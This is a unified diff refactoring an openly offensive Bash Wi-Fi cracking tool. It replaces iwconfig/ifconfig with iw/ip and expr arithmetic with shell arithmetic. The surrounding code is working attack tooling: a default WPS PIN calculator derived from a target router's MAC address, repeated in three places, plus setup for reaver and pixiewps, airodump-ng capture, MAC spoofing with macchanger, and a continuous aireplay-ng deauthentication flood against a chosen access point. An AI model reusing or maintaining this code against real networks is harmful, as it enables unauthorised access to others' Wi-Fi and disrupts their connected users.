@@ -77,7 +77,7 @@ echo ""
 if [ "$mode_monitor" == "active" ]
     then
         echo -e "$White [${Red}!${White}]$BRed Stop$White the ${Green}Monitor Mode$White."
-        ifconfig $mon down && iwconfig $mon mode managed && ifconfig $mon up > /dev/null 2> /dev/null &
+        ip link set $mon down && iw $mon set type managed && ip link set $mon up &> /dev/null &
         echo ""
 fi
 echo -e "$White [+]$Green Greetz to : ${Cyan}AKAS${White} &&${Cyan} Fantome195${White} ."
@@ -314,19 +314,19 @@ arguments() {
 GENERATE_DEFAULT_PIN() {
 						LAST_SIX_DIGITS=$(echo $MAC | awk -F":" '{print $4,$5,$6}' | tr -d " ")
 						HEX_TO_DEC=$(printf '%d\n' 0x${LAST_SIX_DIGITS}) 2> /dev/null
-						HALF_MAC=`expr '(' $HEX_TO_DEC '%' 10000000 ')'`   
-						PIN=`expr 10 '*' $HALF_MAC`
+						HALF_MAC=$(( HEX_TO_DEC % 10000000 ))   
+						PIN=$(( 10 * HALF_MAC ))
 						ACCUM=0                                                        
-						ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`                                                          
-						ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`                                            
-						ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`                                                      
-						ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
-						ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
-						ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
-						ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`
-						THE_REST=`expr $ACCUM '%' 10`
-						CHECK_THE_REST=`expr '(' 10 '-' $THE_REST ')' '%' 10`
-						declare PIN$(echo $MAC | tr -d ":")[1]=$(printf '%08d\n' `expr $PIN '+' $CHECK_THE_REST`)
+						ACCUM=$(( ACCUM + 3 * ((PIN / 10000000) % 10) ))                                                          
+						ACCUM=$(( ACCUM + 1 * ((PIN / 1000000) % 10) ))                                            
+						ACCUM=$(( ACCUM + 3 * ((PIN / 100000) % 10) ))                                                      
+						ACCUM=$(( ACCUM + 1 * ((PIN / 10000) % 10) ))
+						ACCUM=$(( ACCUM + 3 * ((PIN / 1000) % 10) ))
+						ACCUM=$(( ACCUM + 1 * ((PIN / 100) % 10) ))
+						ACCUM=$(( ACCUM + 3 * ((PIN / 10) % 10) ))
+						THE_REST=$(( ACCUM % 10 ))
+						CHECK_THE_REST=$(( (10 - THE_REST) % 10 ))
+						declare PIN$(echo $MAC | tr -d ":")[1]=$(printf '%08d\n' $(( PIN + CHECK_THE_REST )))
 }
 Try_Multi_PIN_REAVER() {
 					Success=2
@@ -514,8 +514,8 @@ listInterfaces() {
 			fi
 		fi
 	done
-	if [ -x "$(command -v iwconfig 2>&1)" ] && [ -x "$(command -v sort 2>&1)" ]; then
-		for iface in $(iwconfig 2> /dev/null | sed 's/^\([a-zA-Z0-9_.]*\) .*/\1/'); do
+	if [ -x "$(command -v iw 2>&1)" ] && [ -x "$(command -v sort 2>&1)" ]; then
+		for iface in $(iw dev 2> /dev/null | awk '/Interface/ {print $2}'); do
 			iface_list="${iface_list}\n ${iface}"
 		done
 		iface_list="$(printf "${iface_list}" | sort -bu)"
@@ -652,7 +652,7 @@ Ver_Mon_WCar_Fun() {
                            max_cs=0
                       	   for (( c=1; c<${GIC}; c++))
        						    do
-       						    	m[$c]=`iwconfig 2>&1 | grep "${INTERFACE[$c]}" | grep "ESSID" | awk '{print $1}'`
+       						    	m[$c]=`iw dev 2>&1 | grep -A1 "Interface ${INTERFACE[$c]}" | grep -v "addr" | awk '/Interface/ {print $2}'`
        						    	if [ "${m[$c]}" != "" ]
        						    		then
        						    			Count_INT=$((Count_INT+1))
@@ -721,7 +721,7 @@ Ver_Mon_WCar_Fun() {
 						   Wait_Msg="Enabling monitor mode on$Green $wlan $White."
 						   End_Msg="${Green}Mode Monitor$White is enabled ."
 						   trap kill_load SIGINT
-						   ifconfig $wlan down && iwconfig $wlan mode monitor && ifconfig $wlan up > /dev/null 2> /dev/null &
+						   ip link set $wlan down && iw $wlan set type monitor && ip link set $wlan up &> /dev/null &
 						   PID="$!"
 						   Loading
 						   trap - SIGINT SIGQUIT SIGTSTP
@@ -740,8 +740,8 @@ Ver_Mon_WCar_Fun() {
                             echo -e $White"     [${Red}!${White}] Wireless Card${Red} Not Found${White} ."
                             sleep 0.5
                  fi
-                 VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
-                 VerCar=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
+                 VerMon=`iw dev 2>&1 | grep 'type monitor'`
+                 VerCar=`iw dev 2>&1 | grep 'Interface' | wc -l`
 }
 Mode_Monitor_Print_Function() {
 									GET_INTERFACE_CHIPSET
@@ -751,7 +751,7 @@ Mode_Monitor_Print_Function() {
                            			max_cs=0
                            			for (( c=1; c<${GIC}; c++))
        						            do
-       						            	m[$c]=`iwconfig 2>&1 | grep "${INTERFACE[$c]}" | grep "Mode:Monitor" | awk '{print $1}'`
+       						            	m[$c]=`iw dev 2>&1 | grep -A1 "Interface ${INTERFACE[$c]}" | grep "type monitor" | head -1`
        						            	if [ "${m[$c]}" != "" ]
        						    				then
        						    					Count_INT=$((Count_INT+1))
@@ -799,10 +799,10 @@ Mode_Monitor_Print_Function() {
 						            echo -e "${White} +${Yellow}----${White}+${Yellow}--${max_sid}${max_si4}---${max_csd}---${White}+"
 }
 Ver_Mon_Fun() {
-                           cou_mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
+                           cou_mon=`iw dev 2>&1 | grep 'type monitor' | wc -l`
 						   if [ $cou_mon -eq 1 ]
 						        then
-								    mon=`iwconfig 2>&1 | grep Mode:Monitor | awk '{print $1}'`
+								    mon=`iw dev 2>&1 | grep -B1 'type monitor' | grep Interface | awk '{print $2}'`
 						   elif [ $cou_mon -gt 1 ]
 						        then
 								    Mode_Monitor_Print_Function
@@ -867,7 +867,7 @@ Loading() {
 Installation() {
                 echo -ne "\r$white [${Red}wait${White}] $NOP not found ..."
 				sleep 2
-                dpkg -i $NOPI > /dev/null 2> /dev/null &
+                dpkg -i $NOPI &> /dev/null &
                 PID="$!"
                 disown $PID
                 Finish=0
@@ -918,8 +918,8 @@ Ver_Pckg_Tools() {
                  hash airmon-ng 2> /dev/null
                  Aircrack_Suite="$?"
 				 Ver_Reaver=`cat ${Temporary}/Ver_Reaver.txt | grep 'mod by t6_x'`
-                 VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
-                 VerCar=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
+                 VerMon=`iw dev 2>&1 | grep 'type monitor'`
+                 VerCar=`iw dev 2>&1 | grep 'Interface' | wc -l`
                  Tools_Folder=`ls -l | grep -E 'Tools$' | grep -E '^d'`
 				 Uname=`uname -m`
 				 Exit=0
@@ -1030,12 +1030,12 @@ Ver_Pckg_Tools() {
 						           Wait_Msg="Wait until the${Green} Pixiewps${white} is${Red} installed${White} ."
 						           End_Msg="Installation of$Green Pixiewps$White is done ."
 						           cd Tools
-					               unzip pixiewps-master.zip > /dev/null 2> /dev/null &
+					               unzip pixiewps-master.zip &> /dev/null &
 					               PID="$!"
 					               disown $PID
 					               sleep 2.0
 						           cd pixiewps-master/src
-						           make > /dev/null 2> /dev/null && make install > /dev/null 2> /dev/null &
+						           make &> /dev/null && make install &> /dev/null &
 						           PID="$!"
 						           Loading
 						           cd ../..
@@ -1053,13 +1053,13 @@ Ver_Pckg_Tools() {
 						           Wait_Msg="Wait until the${Green} Reaver${white} is${Red} installed${White} ."
 						           End_Msg="Installation of$Green Reaver$White is done ."
 						           cd Tools
-					               unzip reaver-wps-fork-t6x-master.zip > /dev/null 2> /dev/null &
+					               unzip reaver-wps-fork-t6x-master.zip &> /dev/null &
 					               PID="$!"
 					               disown $PID
 					               sleep 2.0
 						           cd reaver-wps-fork-t6x-master/src
 						           chmod +x configure
-						           ./configure > /dev/null 2> /dev/null && make > /dev/null 2> /dev/null && make install > /dev/null 2> /dev/null &
+						           ./configure &> /dev/null && make &> /dev/null && make install &> /dev/null &
 						           PID="$!"
 						           Loading
 						           cd ../..
@@ -1100,9 +1100,9 @@ WEP_function() {
 								    if [ "$Ver_Macchanger" -eq "0" ]
 								    	then
 								    		echo -e "${Yellow}          >>${White} Macchanger${White} :"
-								    		ifconfig $mon down 2> /dev/null
-								    		macchanger -r $mon 2> /dev/null > ${Temporary}/MAC.txt
-								    		ifconfig $mon up 2> /dev/null
+								    		ip link set $mon down &> /dev/null
+								    		macchanger -r $mon &> ${Temporary}/MAC.txt
+								    		ip link set $mon up &> /dev/null
 								    		Current_MAC=`cat ${Temporary}/MAC.txt 2> /dev/null | grep "Current MAC" | awk '{print $3}'`
 								    		Permanent_MAC=`cat ${Temporary}/MAC.txt 2> /dev/null | grep "Permanent MAC" | awk '{print $3}'`
 								    		Type_Of_WC=`cat ${Temporary}/MAC.txt 2> /dev/null | grep "Permanent MAC" | cut -d" " -f4-`
@@ -1269,7 +1269,7 @@ SELECT_CAPTURE_CRACK() {
 										else
 										     d=0
 									    fi
-			                            POWER=`expr $POWER + 100`
+			                            POWER=$(( POWER + 100 ))
 			                            CLIENT=`cat ${Temporary}/capture/clients.csv | grep $MAC`
 										Ver_vun=`echo $MAC | cut -c 1-8`
 			                          	if [ "$CLIENT" != "" ]; then
@@ -1314,19 +1314,19 @@ SELECT_CAPTURE_CRACK() {
 									    		Num_OF_PIN[$i]="1"
 									    		LAST_SIX_DIGITS=$(echo $MAC | awk -F":" '{print $4,$5,$6}' | tr -d " ")
 												HEX_TO_DEC=$(printf '%d\n' 0x${LAST_SIX_DIGITS}) 2> /dev/null
-												HALF_MAC=`expr '(' $HEX_TO_DEC '%' 10000000 ')'`   
-												PIN=`expr 10 '*' $HALF_MAC`
+												HALF_MAC=$(( HEX_TO_DEC % 10000000 ))   
+												PIN=$(( 10 * HALF_MAC ))
 												ACCUM=0                                                        
-												ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`                                                          
-												ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`                                            
-												ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`                                                      
-												ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
-												ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
-												ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
-												ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`
-												THE_REST=`expr $ACCUM '%' 10`
-												CHECK_THE_REST=`expr '(' 10 '-' $THE_REST ')' '%' 10`
-												PIN[$i]=$(printf '%08d\n' `expr $PIN '+' $CHECK_THE_REST`)
+												ACCUM=$(( ACCUM + 3 * ((PIN / 10000000) % 10) ))                                                          
+												ACCUM=$(( ACCUM + 1 * ((PIN / 1000000) % 10) ))                                            
+												ACCUM=$(( ACCUM + 3 * ((PIN / 100000) % 10) ))                                                      
+												ACCUM=$(( ACCUM + 1 * ((PIN / 10000) % 10) ))
+																		ACCUM=$(( ACCUM + 3 * ((PIN / 1000) % 10) ))
+																		ACCUM=$(( ACCUM + 1 * ((PIN / 100) % 10) ))
+																		ACCUM=$(( ACCUM + 3 * ((PIN / 10) % 10) ))
+												THE_REST=$(( ACCUM % 10 ))
+												CHECK_THE_REST=$(( (10 - THE_REST) % 10 ))
+												PIN[$i]=$(printf '%08d\n' $(( PIN + CHECK_THE_REST )))
 									    		HHDP_GEN[$i]=1
 									    		HHDP[$i]=1
 									    else
@@ -1828,7 +1828,7 @@ End_OF_THE_SCRIPT(){
 					if [ "$mode_monitor" == "active" ]
     					then
         					echo -e "$White [${Red}!${White}]$Red Stop$White the ${Green}Monitor Mode$White."
-        					ifconfig $mon down && iwconfig $mon mode managed && ifconfig $mon up > /dev/null 2> /dev/null &
+        					ip link set $mon down && iw $mon set type managed && ip link set $mon up &> /dev/null &
         					echo ""
 					fi
 					echo -e "$White [${Red}+${White}]$Green Greetz to ${White}: ${Cyan}AKAS${White} &&${Cyan} Fantome195${White} ."
@@ -2182,7 +2182,7 @@ echo -e "${Yellow}     +${White}------------------------------------------------
 echo ""
 echo -e -n "$White    ${Red} [${Cyan}!${Red}]$White Type the$BRed ID$White of your choice : "
 read menu
-menu=`expr $menu + 0 2> /dev/null`
+menu=$(( menu + 0 )) 2> /dev/null
 case $menu in
              "1")
 			     Ver_Pckg_Tools
@@ -2239,7 +2239,7 @@ case $menu in
 										else
 										     d=0
 									    fi
-			                            POWER=`expr $POWER + 100`
+			                            POWER=$(( POWER + 100 ))
 										Ver_vun=`echo $MAC | cut -c 1-8`
 										if [ "$WPS_LOCKED" == "No" ]
 										    then
@@ -2283,19 +2283,19 @@ case $menu in
 									    		Num_OF_PIN[$i]="1"
 									    		LAST_SIX_DIGITS=$(echo $MAC | awk -F":" '{print $4,$5,$6}' | tr -d " ")
 												HEX_TO_DEC=$(printf '%d\n' 0x${LAST_SIX_DIGITS}) 2> /dev/null
-												HALF_MAC=`expr '(' $HEX_TO_DEC '%' 10000000 ')'`   
-												PIN=`expr 10 '*' $HALF_MAC`
+												HALF_MAC=$(( HEX_TO_DEC % 10000000 ))   
+												PIN=$(( 10 * HALF_MAC ))
 												ACCUM=0                                                        
-												ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`                                                          
-												ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`                                            
-												ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`                                                      
-												ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
-												ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
-												ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
-												ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`
-												THE_REST=`expr $ACCUM '%' 10`
-												CHECK_THE_REST=`expr '(' 10 '-' $THE_REST ')' '%' 10`
-												PIN[$i]=$(printf '%08d\n' `expr $PIN '+' $CHECK_THE_REST`)
+												ACCUM=$(( ACCUM + 3 * ((PIN / 10000000) % 10) ))                                                          
+												ACCUM=$(( ACCUM + 1 * ((PIN / 1000000) % 10) ))                                            
+												ACCUM=$(( ACCUM + 3 * ((PIN / 100000) % 10) ))                                                      
+												ACCUM=$(( ACCUM + 1 * ((PIN / 10000) % 10) ))
+																		ACCUM=$(( ACCUM + 3 * ((PIN / 1000) % 10) ))
+																		ACCUM=$(( ACCUM + 1 * ((PIN / 100) % 10) ))
+																		ACCUM=$(( ACCUM + 3 * ((PIN / 10) % 10) ))
+												THE_REST=$(( ACCUM % 10 ))
+												CHECK_THE_REST=$(( (10 - THE_REST) % 10 ))
+												PIN[$i]=$(printf '%08d\n' $(( PIN + CHECK_THE_REST )))
 									    		HHDP_GEN[$i]=1
 									    		HHDP[$i]=1
 									    else
@@ -2410,7 +2410,7 @@ case $menu in
 						   airodump-ng -w ${Temporary}/capture/capture --output-format csv -a $mon
 						   Line_CSV=`wc -l ${Temporary}/capture/capture-01.csv | awk '{print $1}'`
 						   HeTa=`cat ${Temporary}/capture/capture-01.csv | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}'`
-						   HeTa=`expr $HeTa - 1`
+						   HeTa=$(( HeTa - 1 ))
 						   head -n $HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/capture-02.csv
 						   tail -n +$HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/clients.csv
 						   SELECT_CAPTURE_CRACK
@@ -2418,8 +2418,8 @@ case $menu in
                  ;;
 			"3")
 				  trap - SIGINT SIGQUIT SIGTSTP
-                  VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
-                  VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
+                  VerMon=`iw dev 2>&1 | grep 'type monitor'`
+                  VerCar=`iw dev 2>&1 | grep 'Interface' | wc -l`
                   Ver_Mon_WCar_Fun
                   if [ "$VerMon" != "" ]
                        then
@@ -2518,8 +2518,8 @@ case $menu in
 				    fi
 				    ;;			
 			"4")
-                  VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
-                  VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
+                  VerMon=`iw dev 2>&1 | grep 'type monitor'`
+                  VerCar=`iw dev 2>&1 | grep 'Interface' | wc -l`
                   Ver_Mon_WCar_Fun
                   if [ "$VerMon" != "" ]
                        then
@@ -2583,7 +2583,7 @@ case $menu in
 						   airodump-ng -w ${Temporary}/capture/capture --output-format csv -a $mon
 						   Line_CSV=`wc -l ${Temporary}/capture/capture-01.csv | awk '{print $1}'`
 						   HeTa=`cat ${Temporary}/capture/capture-01.csv | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}'`
-						   HeTa=`expr $HeTa - 1`
+						   HeTa=$(( HeTa - 1 ))
 						   head -n $HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/capture-02.csv
 						   tail -n +$HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/clients.csv
 						   back=0
@@ -2609,7 +2609,7 @@ case $menu in
 										else
 										     d=0
 									    fi
-			                            POWER=`expr $POWER + 100`
+			                            POWER=$(( POWER + 100 ))
 			                            CLIENT=`cat ${Temporary}/capture/clients.csv | grep $MAC`
 										Ver_vun=`echo $MAC | cut -c 1-8`
 			                          	if [ "$CLIENT" != "" ]; then
@@ -2695,7 +2695,7 @@ case $menu in
 						   Airodump_PID=$!
 						   disown $Airodump_PID
 						   tset
-						   aireplay-ng -0 0 -a $BSSID $mon > /dev/null 2> /dev/null &
+						   aireplay-ng -0 0 -a $BSSID $mon &> /dev/null &
 						   aireplayID=$!
 						   disown $aireplayID
 						   Quit=0
@@ -2720,7 +2720,7 @@ case $menu in
 						   sleep 2.0
 						   Line_CSV=`wc -l ${Temporary}/capture/capture-01.csv | awk '{print $1}'`
 						   HeTa=`cat ${Temporary}/capture/capture-01.csv | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}'`
-						   HeTa=`expr $HeTa - 1`
+						   HeTa=$(( HeTa - 1 ))
 						   head -n $HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/capture-02.csv
 						   tail -n +$HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/clients.csv
 						   SELECT_CAPTURE_CRACK
@@ -2742,17 +2742,17 @@ case $menu in
                   echo ""
                   echo -e -n "$White    ${Red} [${Cyan}!${Red}]$White Type the$BRed ID$White of your choice : "
                   read ID
-                  ID=`expr $ID + 0 2> /dev/null`
+                  ID=$(( ID + 0 )) 2> /dev/null
                   echo ""
                   case $ID in
                                "1")
                                    VerMon=""
-                                   VerCar=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
+                                   VerCar=`iw dev 2>&1 | grep 'Interface' | wc -l`
                                    Ver_Mon_WCar_Fun
                                    mode_monitor=no
                                    ;;
 							   "2")
-						           cou_mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
+						           cou_mon=`iw dev 2>&1 | grep 'type monitor' | wc -l`
 						           if [ $cou_mon -ge 1 ]
 						                then
 								            Mode_Monitor_Print_Function
@@ -2778,7 +2778,7 @@ case $menu in
 								            done
 											echo ""
 											trap kill_load SIGINT
-											ifconfig $mon down && iwconfig $mon mode managed && ifconfig $mon up > /dev/null 2> /dev/null &
+											ip link set $mon down && iw $mon set type managed && ip link set $mon up &> /dev/null &
 						                    PID="$!"
 						                    Wait_Msg="Disabling${Cyan} Monitor Mode${White} on$Green $mon $White."
 						                    End_Msg="${Cyan}Monitor Mode${White}$White is${Red} Disable ."
